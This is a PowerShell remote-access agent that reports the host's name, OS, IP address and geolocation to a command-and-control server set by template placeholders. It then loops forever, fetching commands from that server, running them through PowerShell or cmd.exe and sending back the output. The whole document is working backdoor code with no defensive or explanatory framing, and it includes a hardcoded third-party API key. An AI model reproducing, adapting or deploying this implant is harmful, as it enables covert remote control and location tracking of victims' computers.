$C2 = "http://{C2_HOST}:{C2_PORT}"

# Agent info
$hostname = $env:COMPUTERNAME
$os = (Get-CimInstance Win32_OperatingSystem).Caption

# Get public IP address first (for geolocation)
$publicIP = $null
try {
    Write-Host "DEBUG: Fetching public IP address..."
    $publicIP = Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 10
    if ($publicIP -and $publicIP -match '^\d+\.\d+\.\d+\.\d+$') {
        Write-Host "DEBUG: Public IP retrieved: $publicIP"
    } else {
        Write-Host "DEBUG: Invalid public IP format: $publicIP"
        $publicIP = $null
    }
} catch {
    Write-Host "DEBUG: Failed to get public IP: $($_.Exception.Message)"
    # Try alternative service
    try {
        $publicIP = (Invoke-RestMethod -Uri "https://ifconfig.me/ip" -TimeoutSec 10).Trim()
        if ($publicIP -match '^\d+\.\d+\.\d+\.\d+$') {
            Write-Host "DEBUG: Public IP retrieved from alternative service: $publicIP"
        } else {
            $publicIP = $null
        }
    } catch {
        Write-Host "DEBUG: Alternative public IP service also failed: $($_.Exception.Message)"
    }
}

# Get local IP address for registration (fallback to public if local not available)
$ip = $publicIP  # Default to public IP
try {
    # Method 1: Get primary IPv4 address from active network adapters
    $localIP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Ethernet*" | Where-Object {$_.IPAddress -notlike "169.254.*" -and $_.IPAddress -notlike "127.*"} | Select-Object -First 1).IPAddress
    if (-not $localIP) {
        # Method 2: Get from WiFi adapters if Ethernet fails
        $localIP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Wi-Fi*" | Where-Object {$_.IPAddress -notlike "169.254.*" -and $_.IPAddress -notlike "127.*"} | Select-Object -First 1).IPAddress
    }
    if (-not $localIP) {
        # Method 3: Get from any active adapter
        $localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notlike "169.254.*" -and $_.IPAddress -notlike "127.*" -and $_.IPAddress -notlike "::*"} | Select-Object -First 1).IPAddress
    }
    if (-not $localIP) {
        # Method 4: Use ipconfig as last resort
        $ipconfig = ipconfig | Select-String "IPv4 Address" | Select-Object -First 1
        if ($ipconfig) {
            $localIP = ($ipconfig -replace ".*: ", "").Trim()
        }
    }
    
    # Use local IP if found, otherwise use public IP
    if ($localIP -and $localIP -match '^\d+\.\d+\.\d+\.\d+$') {
        $ip = $localIP
        Write-Host "DEBUG: Using local IP for registration: $ip"
    } elseif ($publicIP) {
        Write-Host "DEBUG: No local IP found, using public IP: $ip"
    }
} catch {
    Write-Host "DEBUG: Error in local IP detection methods: $($_.Exception.Message)"
    if ($publicIP) {
        Write-Host "DEBUG: Using public IP as fallback: $ip"
    }
}

# Final validation and fallback
if (-not $ip -or $ip -eq "" -or $ip -like "169.254.*" -or $ip -like "127.*") {
    $ip = "Unknown"
    Write-Host "DEBUG: All IP detection methods failed, setting to Unknown"
} else {
    Write-Host "DEBUG: Successfully detected IP: $ip"
}

# Additional validation before sending
Write-Host "DEBUG: Final IP value: '$ip'"
Write-Host "DEBUG: IP type: $($ip.GetType().Name)"
Write-Host "DEBUG: IP length: $($ip.Length)"
Write-Host "DEBUG: IP contains only digits and dots: $($ip -match '^\d+\.\d+\.\d+\.\d+$')"

# Ensure IP is a valid IPv4 format
if ($ip -match '^\d+\.\d+\.\d+\.\d+$') {
    Write-Host "DEBUG: IP format is valid IPv4"
} else {
    Write-Host "DEBUG: IP format is NOT valid IPv4, attempting to fix..."
    # Try to extract IP from the string if it contains one
    if ($ip -match '\d+\.\d+\.\d+\.\d+') {
        $ip = $matches[0]
        Write-Host "DEBUG: Extracted valid IP from string: $ip"
    } else {
        Write-Host "DEBUG: Could not extract valid IP, keeping as: $ip"
    }
}

# Get geolocation data using AbstractAPI IP Intelligence
# IMPORTANT: Use public IP for geolocation lookup, not private IP
$abstractApiKey = "95e0f24fa88e4e70b39b744938daa8eb"
$latitude = $null
$longitude = $null
$country = $null
$region = $null
$city = $null
$timezone = $null
$isp = $null

# Use public IP for geolocation (private IPs won't work with geolocation APIs)
$geoIP = $publicIP
if (-not $geoIP -or $geoIP -eq "" -or $geoIP -like "169.254.*" -or $geoIP -like "127.*") {
    $geoIP = $ip  # Fallback to whatever IP we have
}

if ($geoIP -and $geoIP -ne "Unknown" -and $geoIP -match '^\d+\.\d+\.\d+\.\d+$') {
    try {
        $apiUrl = "https://ip-intelligence.abstractapi.com/v1/?api_key=$abstractApiKey&ip_address=$geoIP"
        Write-Host "DEBUG: Fetching geolocation from AbstractAPI for IP: $geoIP"
        Write-Host "DEBUG: API URL: $apiUrl"
        
        $geoResponse = Invoke-RestMethod -Uri $apiUrl -TimeoutSec 10
        
        Write-Host "DEBUG: Full API response: $($geoResponse | ConvertTo-Json -Depth 10)"
        
        # Map AbstractAPI IP Intelligence response fields
        # Note: latitude, longitude, city, country, region are nested in 'location' object
        if ($geoResponse.location) {
            $latitude = $geoResponse.location.latitude
            $longitude = $geoResponse.location.longitude
            $country = $geoResponse.location.country
            $region = $geoResponse.location.region
            $city = $geoResponse.location.city
            Write-Host "DEBUG: Extracted from location object - Lat: $latitude, Lon: $longitude, City: $city, Country: $country"
        } else {
            # Fallback to top-level (for backward compatibility)
            $latitude = $geoResponse.latitude
            $longitude = $geoResponse.longitude
            $country = $geoResponse.country
            $region = $geoResponse.region
            $city = $geoResponse.city
            Write-Host "DEBUG: Using top-level fields (fallback)"
        }
        
        # Handle timezone (can be object or string)
        if ($geoResponse.timezone) {
            if ($geoResponse.timezone.GetType().Name -eq "PSCustomObject") {
                $timezone = $geoResponse.timezone.name
            } else {
                $timezone = $geoResponse.timezone
            }
        } else {
            $timezone = "UTC"
        }
        
        # Handle ISP/Company (can be object or string)
        if ($geoResponse.company) {
            if ($geoResponse.company.GetType().Name -eq "PSCustomObject") {
                $isp = $geoResponse.company.name
            } else {
                $isp = $geoResponse.company
            }
        } elseif ($geoResponse.asn) {
            if ($geoResponse.asn.GetType().Name -eq "PSCustomObject") {
                $isp = $geoResponse.asn.name
            } else {
                $isp = $geoResponse.asn
            }
        } elseif ($geoResponse.connection) {
            if ($geoResponse.connection.GetType().Name -eq "PSCustomObject") {
                $isp = $geoResponse.connection.isp
            } else {
                $isp = $geoResponse.connection
            }
        } elseif ($geoResponse.isp) {
            $isp = $geoResponse.isp
        } else {
            $isp = "Unknown"
        }
        
        Write-Host "DEBUG: Geolocation retrieved - City: $city, Country: $country, Lat: $latitude, Lon: $longitude"
        Write-Host "DEBUG: Full response: $($geoResponse | ConvertTo-Json -Depth 5)"
    } catch {
        Write-Host "DEBUG: Failed to get geolocation from AbstractAPI: $($_.Exception.Message)"
        Write-Host "DEBUG: Error details: $($_.Exception)"
        if ($_.Exception.Response) {
            $reader = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
            $responseBody = $reader.ReadToEnd()
            Write-Host "DEBUG: API Response: $responseBody"
        }
        # Keep values as null
    }
} else {
    Write-Host "DEBUG: Skipping geolocation lookup - IP is Unknown or invalid"
    Write-Host "DEBUG: geoIP value: '$geoIP'"
    Write-Host "DEBUG: publicIP value: '$publicIP'"
    Write-Host "DEBUG: ip value: '$ip'"
}

# Register with C2
$body = @{
    hostname = $hostname
    os = $os
    ip = $ip
} | ConvertTo-Json

Write-Host "DEBUG: Registration body: $body"
Write-Host "DEBUG: Sending registration to: $C2/register"

try {
    $response = Invoke-RestMethod -Uri "$C2/register" -Method POST -Body $body -ContentType "application/json"
    Write-Host "DEBUG: Registration successful: $response"
} catch {
    Write-Host "DEBUG: Registration failed: $($_.Exception.Message)"
    Write-Host "DEBUG: Response status: $($_.Exception.Response.StatusCode)"
    Write-Host "DEBUG: Response body: $($_.Exception.Response.Body)"
}

# Send geolocation data to C2
# Use public IP in geolocation data if available
$geoIPForC2 = if ($publicIP) { $publicIP } else { $ip }

if ($latitude -and $longitude) {
    $geoBody = @{
        hostname = $hostname
        ip = $geoIPForC2
        country = $country
        region = $region
        city = $city
        latitude = $latitude
        longitude = $longitude
        timezone = $timezone
        isp = $isp
    } | ConvertTo-Json
    
    Write-Host "DEBUG: Geolocation body: $geoBody"
    Write-Host "DEBUG: Sending geolocation to: $C2/api/geolocation/$hostname"
    
    try {
        $geoResponse = Invoke-RestMethod -Uri "$C2/api/geolocation/$hostname" -Method POST -Body $geoBody -ContentType "application/json"
        Write-Host "DEBUG: Geolocation update successful: $geoResponse"
    } catch {
        Write-Host "DEBUG: Geolocation update failed: $($_.Exception.Message)"
        # Silently fail if geolocation update fails
    }
} else {
    Write-Host "DEBUG: Skipping geolocation update - missing coordinates"
    Write-Host "DEBUG: Latitude: $latitude, Longitude: $longitude"
}

# Function to send geolocation update
function Send-GeolocationUpdate {
    if ($latitude -and $longitude -and $geoIPForC2) {
        $geoBody = @{
            hostname = $hostname
            ip = $geoIPForC2
            country = $country
            region = $region
            city = $city
            latitude = $latitude
            longitude = $longitude
            timezone = $timezone
            isp = $isp
        } | ConvertTo-Json
        
        try {
            $geoResponse = Invoke-RestMethod -Uri "$C2/api/geolocation/$hostname" -Method POST -Body $geoBody -ContentType "application/json"
            Write-Host "DEBUG: Periodic geolocation update successful: $geoResponse"
        } catch {
            Write-Host "DEBUG: Periodic geolocation update failed: $($_.Exception.Message)"
        }
    }
}

# Main persistent loop
$lastRegistration = Get-Date
$lastGeolocationUpdate = Get-Date
$registrationInterval = 300  # Re-register every 5 minutes
$geolocationUpdateInterval = 600  # Update geolocation every 10 minutes

Write-Host "DEBUG: Starting main loop with IP: $ip"
Write-Host "DEBUG: Will re-register every $registrationInterval seconds"
Write-Host "DEBUG: Will update geolocation every $geolocationUpdateInterval seconds"

while ($true) {
    try {
        $currentTime = Get-Date
        
        # Re-register periodically to keep IP address current
        if (($currentTime - $lastRegistration).TotalSeconds -ge $registrationInterval) {
            Write-Host "DEBUG: Re-registering agent..."
            $body = @{ hostname = $hostname; os = $os; ip = $ip } | ConvertTo-Json
            Write-Host "DEBUG: Re-registration body: $body"
            
            try {
                $response = Invoke-RestMethod -Uri "$C2/register" -Method POST -Body $body -ContentType "application/json"
                Write-Host "DEBUG: Re-registration successful: $response"
                $lastRegistration = $currentTime
            } catch {
                Write-Host "DEBUG: Re-registration failed: $($_.Exception.Message)"
            }
        }
        
        # Update geolocation periodically
        if (($currentTime - $lastGeolocationUpdate).TotalSeconds -ge $geolocationUpdateInterval) {
            Write-Host "DEBUG: Sending periodic geolocation update..."
            Send-GeolocationUpdate
            $lastGeolocationUpdate = $currentTime
        }
        
        $cmd = Invoke-RestMethod -Uri "$C2/command/$hostname"
        if ($cmd -ne "") {
            Write-Host "DEBUG: Received command: $cmd"
            
            # Choose shell based on command
            if ($cmd -match "Get-|Invoke-|Select-|Format-|New-|Out-") {
                # Assume it's a PowerShell command
                Write-Host "DEBUG: Executing as PowerShell command"
                $output = powershell.exe -Command $cmd | Out-String
            }
            else {
                # Run in CMD
                Write-Host "DEBUG: Executing as CMD command"
                $output = cmd.exe /c $cmd | Out-String
            }
            
            Write-Host "DEBUG: Command output length: $($output.Length)"
            
            $resultBody = @{ output = $output } | ConvertTo-Json
            Invoke-RestMethod -Uri "$C2/result/$hostname" -Method POST -Body $resultBody -ContentType "application/json"
            Write-Host "DEBUG: Command result sent successfully"
        }
        Start-Sleep -Seconds 3
    }
    catch {
        Write-Host "DEBUG: Error in main loop: $($_.Exception.Message)"
        Start-Sleep -Seconds 3
    }
}
